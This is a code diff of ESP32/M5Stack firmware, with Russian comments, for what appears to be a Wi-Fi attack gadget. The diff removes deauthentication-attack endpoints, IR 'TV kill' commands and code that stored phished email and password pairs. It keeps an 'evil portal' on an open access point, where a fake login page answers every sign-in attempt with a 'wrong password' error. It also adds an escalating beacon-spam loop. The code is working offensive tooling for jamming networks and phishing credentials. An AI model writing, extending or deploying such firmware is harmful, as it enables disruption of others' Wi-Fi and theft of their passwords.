-        html += s + " | CH: " + String(ch) + " | " + String(rssi) + "dBm</div>";
-      }
-    }
-    WiFi.scanDelete();
-    scan_in_progress = false;
-    server.send(200, "text/html", html);
-  });
-
-  server.on("/deauth/on", HTTP_GET, [](){
-    if (server.hasArg("bssid") && server.hasArg("channel")) {
-      String bssidStr = server.arg("bssid");
-      sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
-             &target_bssid[0], &target_bssid[1], &target_bssid[2], 
-             &target_bssid[3], &target_bssid[4], &target_bssid[5]);
-      target_channel = server.arg("channel").toInt();
-      esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
-      isDeauthing = true;
-      drawUI();
-      server.send(200, "text/plain", "DEAUTH ON");
-    } else server.send(400, "text/plain", "NO BSSID");
-  });
-
-  server.on("/deauth/off", HTTP_GET, [](){
-    isDeauthing = false;
-    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
-    drawUI();
-    server.send(200, "text/plain", "DEAUTH OFF");
-  });
-
-  server.on("/tv/kill", HTTP_GET, [](){
-    if (server.hasArg("brand") && server.hasArg("region")) {
-      int brand = server.arg("brand").toInt();
-      int region = server.arg("region").toInt();
-      killTvBrand(region, brand);
-      server.send(200, "text/plain", "FIRED!");
-    } else server.send(400, "text/plain", "NO BRAND");
-  });
-
-  server.on("/tv/killall", HTTP_GET, [](){
-    if (server.hasArg("region")) {
-      int region = server.arg("region").toInt();
-      killAllTv(region);
-      server.send(200, "text/plain", "ALL FIRED!");
-    } else server.send(400, "text/plain", "NO REGION");
-  });
-
+  
   server.on("/portal/on", HTTP_GET, [](){
     isEvilPortalActive = true;
     dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
@@ -653,10 +229,14 @@ void setupServer() {
     server.send(200, "text/plain", "PORTAL OFF");
   });
 
+  server.on("/status", HTTP_GET, [](){
+    String status = "";
+    if (isSpamming) status += "WIFI_ON,";
+    if (isEvilPortalActive) status += "PORTAL_ON,";
+    server.send(200, "text/plain", status);
+  });
+
   server.on("/login", HTTP_POST, [](){
-    String email = server.arg("email");
-    String pass = server.arg("password");
-    savePassword(email, pass);
     server.send(200, "text/html", "<html><body style='background:#000;color:#fff;text-align:center;padding:50px;'><h1>ОШИБКА</h1><p>Неверный пароль. Попробуйте еще раз.</p></body></html>");
   });
 
@@ -678,12 +258,9 @@ void setup() {
   Serial.begin(115200);
   
   if(!SPIFFS.begin(true)) Serial.println("SPIFFS Error");
-  loadLogs();
-
-  ledcAttach(IR_PIN, 38000, 8);
 
   WiFi.mode(WIFI_AP);
-  WiFi.softAP("M5_Bruce");
+  WiFi.softAP("M5_BeaconEvil"); // Без пароля
 
   esp_wifi_set_ps(WIFI_PS_NONE);
   esp_wifi_set_promiscuous(true);
@@ -704,40 +281,25 @@ void loop() {
   if (isEvilPortalActive) dnsServer.processNextRequest();
   M5.update();
 
-  if (isTvKilling) return; 
-
-  if (M5.BtnA.wasPressed()) {
-    currentTheme++;
-    if (currentTheme >= 12) currentTheme = 0;
-    drawUI();
-    delay(150);
-  }
-
-  if (M5.BtnB.wasPressed()) {
-    isSpamming = !isSpamming;
-    drawUI();
-    delay(150); 
-  }
-
-  if (isSpamming && (millis() - lastBeaconTime > 5)) {
+  // НАКОПИТЕЛЬНЫЙ СПАМ: каждые 5 секунд отправляем 'currentBurst' пакетов и увеличиваем счетчик
+  if (isSpamming && (millis() - lastBeaconTime >= 5000)) {
     lastBeaconTime = millis();
-    for(int i = 0; i < 30; i++) sendBeaconSpam();
     
-    static unsigned long lastDisplayUpdate = 0;
-    if (millis() - lastDisplayUpdate > 1000) {
-      lastDisplayUpdate = millis();
-      drawUI();
+    // Отправляем текущую пачку
+    for(int i = 0; i < currentBurst; i++) {
+      sendBeaconSpam();
+      delay(1); // Микро-пауза, чтобы Wi-Fi стек не захлебнулся
     }
-  }
-
-  if (isDeauthing && (millis() - lastDeauthTime > 5)) {
-    lastDeauthTime = millis();
-    for(int i = 0; i < 20; i++) sendDeauth();
     
-    static unsigned long lastDisplayUpdate = 0;
-    if (millis() - lastDisplayUpdate > 1000) {
-      lastDisplayUpdate = millis();
-      drawUI();
+    // Увеличиваем счетчик для следующего цикла
+    currentBurst += 100;
+    
+    // Если счетчик стал слишком большим (например, больше 2000), сбрасываем его,
+    // чтобы стик не ушел в бесконечный цикл на 5 секунд (он не будет успевать обновлять веб-интерфейс)
+    if (currentBurst > 2000) {
+      currentBurst = 100;
     }
+    
+    drawUI();
   }
 }
